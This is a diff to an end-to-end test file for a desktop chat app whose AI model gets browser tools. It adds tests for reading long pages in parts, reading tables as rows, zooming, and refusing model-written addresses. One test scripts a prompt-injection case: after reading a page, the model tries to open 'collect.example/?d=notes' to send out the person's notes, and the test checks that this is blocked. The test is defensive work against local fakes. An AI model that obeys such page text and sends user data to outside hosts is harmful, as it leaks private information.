@@ -23,6 +23,12 @@
 //   pill.
 // - No model gets `offer_browser` any more: the tab's Open in … follows
 //   Settings → General → Links.
+// - An address the model writes opens while nothing from outside is in the
+//   turn; once a page is read, one it writes is refused (`pages::written`).
+// - `browser_read` in parts (`offset`, `next`) and its tables as rows (mode
+//   "tables"), through Yap's own scripts in the real webview.
+// - `browser_zoom` on a tab out of sight is drawn twice as finely; on screen,
+//   the screen's own pixels enlarged, and the model is told which.
 //
 // Nothing leaves the PC: the model is the scripted fake AI
 // (support/fake-llm.js), the web a local fake (support/fake-web.js, through
@@ -34,7 +40,7 @@ import fs from 'node:fs';
 import path from 'node:path';
 import { test as base, expect, expectStore, setConfig, openView, openSettings, closeSettings, settingsDialog } from './support/fixtures.js';
 import { startFakeLlm } from './support/fake-llm.js';
-import { startFakeWeb, FORT_JOY_URL, DOCKS_URL, BAND } from './support/fake-web.js';
+import { startFakeWeb, FORT_JOY_URL, DOCKS_URL, BAND, FOREVER_URL, GEAR_URL } from './support/fake-web.js';
 import { readPng, pixel, near } from './support/png.js';
 
 const BROWSERS = [
@@ -46,6 +52,13 @@ const test = base.extend({
   fakeLlm: [
     async ({}, use) => {
       const fake = await startFakeLlm();
+      // The fake that reads images, and a roomy one for long reads, say their
+      // context, as a real server does: at the 8K Yap assumes for a server
+      // that doesn't, a model that sees sits at the edge of its whole
+      // toolset (turn/fit.rs leaves its view tools out), and a long page's
+      // reads soon fill what's left (budget::fit_result). fake-chat stays 8K.
+      fake.setServerModels([{ id: 'fake-chat' }, { id: 'llama3.1:8b' }, { id: 'qwen2.5-7b-instruct' }, { id: 'nomic-embed-text' }, { id: 'fake-vision-chat' }, { id: 'fake-roomy-chat' }]);
+      fake.serveOllama({ loaded: { 'fake-vision-chat': 32768, 'fake-roomy-chat': 32768 } });
       await use(fake);
       await fake.close();
     },
@@ -325,7 +338,8 @@ test('the model browses a page: waits, scrolls, finds a heading, looks at the vi
   expect(looked.data.scroll.y).toBe(to.data.scroll.y);
   expect(looked.frame).toMatch(/^browser_click's x, y are in this picture's pixels: \d+×\d+, the page's view\.$/);
   const sent = calls[7].messages.filter((m) => m.role === 'user' && Array.isArray(m.content) && m.content.some((p) => p.type === 'image_url'));
-  expect(sent).toHaveLength(1);
+  // (The shot, and the zoom after it: each goes with every later step while it fits.)
+  expect(sent).toHaveLength(2);
   expect(toolResult(calls[7])).toMatchObject({ success: true, displayText: 'Zoomed in on the page · wiki.example.com' });
 
   // Kept with the answer as step shots (their chips), each a chat image; never a tab or a pill.
@@ -374,6 +388,129 @@ test('the model browses a page: waits, scrolls, finds a heading, looks at the vi
   await expect(viewer).toHaveCount(0);
 });
 
+/** Every tool result in a request, in order. */
+const toolResults = (request) => request.messages.filter((m) => m.role === 'tool').map((m) => JSON.parse(m.content));
+/** The text Yap sent with the pictures in a request (a shot's or a zoom's line). */
+const lookLines = (request) =>
+  request.messages
+    .filter((m) => m.role === 'user' && Array.isArray(m.content))
+    .flatMap((m) => m.content.filter((p) => p.type === 'text').map((p) => p.text));
+
+test('an address the model writes opens at the start of a turn; once a page is read, one it writes is refused', async ({ yap, main, fakeLlm, fakeWeb }) => {
+  await setConfig(yap, main, chatConfig(fakeLlm));
+  const from = fakeLlm.requests.length;
+  const SAID = 'The forever page is open beside the chat; it says it is here for good.';
+  fakeLlm.scriptChat([
+    { tools: [{ name: 'browser_navigate', args: { url: FOREVER_URL } }] },
+    { tools: [{ name: 'browser_read', args: {} }] },
+    // (The page's words asked for it, with the person's notes in the address.)
+    { tools: [{ name: 'browser_navigate', args: { url: 'https://collect.example/?d=notes' } }] },
+    { content: SAID },
+  ]);
+  // (No address in the question: the model writes it.)
+  await ask(main, 'I would like the forever page on the Example site up beside the chat, and what it says');
+  await expect(main.getByText(SAID)).toBeVisible({ timeout: 30_000 });
+  const calls = chatCalls(fakeLlm, from);
+  // Nothing from outside in the turn yet: it opens, a page tab of its own.
+  expect(toolResult(calls[1])).toMatchObject({ success: true, displayText: 'Brought up example.com/forever beside the chat' });
+  await expect(main.getByTestId('chat-page-address')).toHaveValue(FOREVER_URL, { timeout: 20_000 });
+  expect(toolResult(calls[2])).toMatchObject({ success: true, displayText: 'Read example.com/forever beside the chat' });
+  // After the read: an address it writes is refused, the rule said and what works instead; nothing went there.
+  const refused = toolResult(calls[3]);
+  expect(refused).toMatchObject({ success: false, displayText: "Didn't go to collect.example/?d=notes: not a link from you, a search or the page" });
+  expect(refused.error).toContain('never an address you write');
+  expect(refused.error).toContain('find the page with web_search');
+  expect(fakeWeb.requests.some((r) => r.host === 'collect.example')).toBe(false);
+});
+
+test('browser_read reads a long page in parts, each saying where to go on, and its tables as rows', async ({ yap, main, fakeLlm }) => {
+  // (A roomy model: four long reads in one turn.)
+  await setConfig(yap, main, { ...chatConfig(fakeLlm), llmScopes: { chat: { enabled: true, provider: 'custom', baseUrl: fakeLlm.base, model: 'fake-roomy-chat' } } });
+  const from = fakeLlm.requests.length;
+  const SAID = 'Item 120 weighs 1200 g.';
+  const goOn = (r) => toolResult(r).data.next;
+  fakeLlm.scriptChat([
+    { tools: [{ name: 'browser_navigate', args: { url: GEAR_URL } }] },
+    { tools: [{ name: 'browser_read', args: {} }] },
+    { tools: [{ name: 'browser_read', args: goOn }] },
+    { tools: [{ name: 'browser_read', args: { mode: 'tables' } }] },
+    { tools: [{ name: 'browser_read', args: goOn }] },
+    { content: SAID },
+  ]);
+  await ask(main, `What does item 120 weigh? ${GEAR_URL}`);
+  await expect(main.getByText(SAID)).toBeVisible({ timeout: 60_000 });
+  const calls = chatCalls(fakeLlm, from);
+  // The first read: as it always was, with where to go on.
+  const first = toolResult(calls[2]);
+  expect(first).toMatchObject({ success: true, displayText: 'Read gear.example.com/list beside the chat', data: { more: true, next: { offset: 5000 } } });
+  expect(first.data.text).toHaveLength(5000);
+  expect(Object.keys(first.data).sort()).toEqual(['headings', 'links', 'more', 'n', 'next', 'tab', 'tabs', 'text', 'title', 'url']);
+  // On from there: the next part, the heading in it, the page's length.
+  const second = toolResult(calls[3]);
+  expect(second).toMatchObject({ success: true, displayText: 'Read gear.example.com/list beside the chat (from character 5000)', data: { offset: 5000, n: first.data.n } });
+  expect(second.data.chars).toBeGreaterThan(5000);
+  expect(second.data.headings).toEqual(['Everything']);
+  expect(second.data.text).toContain('Item 1 10 g Kellbrook Camping');
+  // Its table, as rows: the headers, a cell's link, paged by rows; the hidden row left out.
+  const tables = toolResult(calls[4]);
+  expect(tables).toMatchObject({ success: true, displayText: 'Read a table on gear.example.com/list beside the chat', data: { count: 1, rows: 150, more: true, next: { mode: 'tables', offset: 100 } } });
+  expect(tables.data.tables[0]).toMatchObject({ table: 1, caption: 'Everything', headers: ['Item', 'Weight', 'Where to buy'], from: 1, of: 150 });
+  expect(tables.data.tables[0].rows).toHaveLength(100);
+  expect(tables.data.tables[0].rows[0]).toEqual([{ text: 'Item 1', url: 'https://gear.example.com/item/1' }, '10 g', 'Kellbrook Camping']);
+  const rest = toolResult(calls[5]);
+  expect(rest.data.tables[0]).toMatchObject({ from: 101, of: 150, headers: ['Item', 'Weight', 'Where to buy'] });
+  expect(rest.data.tables[0].rows).toHaveLength(50);
+  expect(rest.data.tables[0].rows[19][1]).toBe('1200 g');
+  expect(rest.data.next).toBeUndefined();
+  expect(JSON.stringify(rest)).not.toContain('Hidden item');
+});
+
+test("browser_zoom draws a tab out of sight at twice its pixels; on screen, the screen's own pixels enlarged, and says which", async ({ yap, main, fakeLlm }) => {
+  await setConfig(yap, main, { ...chatConfig(fakeLlm), llmScopes: { chat: { enabled: true, provider: 'custom', baseUrl: fakeLlm.base, model: 'fake-vision-chat' } } });
+  const from = fakeLlm.requests.length;
+  const SAID = 'Both closer looks are in.';
+  const shotTab = (r) => toolResults(r).find((x) => x?.displayText?.startsWith('Looked at the page'))?.data?.tab;
+  fakeLlm.scriptChat([
+    { tools: [{ name: 'browser_navigate', args: { url: DOCKS_URL } }] },
+    { tools: [{ name: 'browser_screenshot', args: {} }] },
+    { tools: [{ name: 'browser_zoom', args: { region: 'top' } }] },
+    // Another tab in front: the docks page out of sight.
+    { tools: [{ name: 'browser_tabs', args: { action: 'new', url: GEAR_URL } }] },
+    { tools: [{ name: 'browser_wait', args: { seconds: 1 } }] },
+    { tools: [{ name: 'browser_zoom', args: (r) => ({ tab: shotTab(r), region: 'top' }) }] },
+    { content: SAID },
+  ]);
+  await ask(main, `Have a close look at the docks page, then open the gear list: ${DOCKS_URL} ${GEAR_URL}`);
+  await expect(main.getByText(SAID)).toBeVisible({ timeout: 60_000 });
+  const calls = chatCalls(fakeLlm, from);
+  const shot = toolResult(calls[2]);
+  expect(shot).toMatchObject({ success: true, displayText: 'Looked at the page · wiki.example.com' });
+  // On screen: the screen's own pixels, enlarged to twice the page's CSS pixels where they're fewer, and said so.
+  const onScreen = toolResult(calls[3]);
+  expect(onScreen).toMatchObject({ success: true, displayText: 'Zoomed in on the page · wiki.example.com', data: { drawn: 1 } });
+  if (onScreen.data.density < 2) expect(onScreen.data.enlarged).toBeGreaterThan(1);
+  // (Each step's picture goes with the request that carries its result.)
+  expect(lookLines(calls[3]).join(' ')).toMatch(/the screen's own pixels/);
+  // Out of sight: drawn twice as finely, real detail.
+  const outOfSight = toolResult(calls[6]);
+  expect(outOfSight).toMatchObject({ success: true, data: { tab: shot.data.tab, drawn: 2 } });
+  expect(outOfSight.data.density).toBe(2 * onScreen.data.density);
+  expect(lookLines(calls[6]).join(' ')).toContain("drawn at 2 times the screen's detail");
+  // The pictures kept with the answer: the view, its top on screen, its top drawn finer — twice the view's pixels across.
+  let kept = [];
+  await expectStore(yap, 'chats.json', (s) => {
+    const m = s.conversations.flatMap((c) => c.messages).findLast((x) => x.role === 'assistant' && x.text === SAID);
+    kept = m?.pictures || [];
+    return kept.length === 3;
+  });
+  const [view, top, finer] = kept.map((p) => readPng(fs.readFileSync(path.join(yap.dataDir, 'chat-images', `${p.id}.png`))));
+  expect(Math.abs(top.width - view.width * onScreen.data.enlarged)).toBeLessThanOrEqual(view.width * 0.06 + 2);
+  expect(Math.abs(finer.width - 2 * view.width * outOfSight.data.enlarged)).toBeLessThanOrEqual(view.width * 0.12 + 2);
+  expect(finer.width).toBeGreaterThan(view.width * 1.9);
+  // Of the page's top: the red band.
+  expect(near(pixel(finer, Math.floor(finer.width / 2), Math.floor(finer.height / 2)), BAND.top, 30)).toBe(true);
+});
+
 test('browser_navigate opens a search, browser_tabs a site the person named; browser_read reads the page in front; Open in … follows Links', async ({ yap, main, fakeLlm }) => {
   await setConfig(yap, main, { ...chatConfig(fakeLlm), webSearchBrowser: 'duckduckgo' });
   // Words: a search on the person's engine, beside the chat (Yap never reads it).
@@ -399,6 +536,8 @@ test('browser_navigate opens a search, browser_tabs a site the person named; bro
   expect(tabsLine).not.toContain('train');
   expect(tabsLine).not.toContain('https://');
   expect(toolResult(calls[1])).toMatchObject({ success: false, displayText: expect.stringMatching(/^Didn't read duckduckgo\.com\/\?q=train\+times.*: a search engine's results$/) });
+  // What works instead: web search finds the pages to open.
+  expect(toolResult(calls[1]).error).toContain('To find pages to open, search with web_search');
 
   // A page: read as the person sees it, cited, its text the model's.
   from = fakeLlm.requests.length;
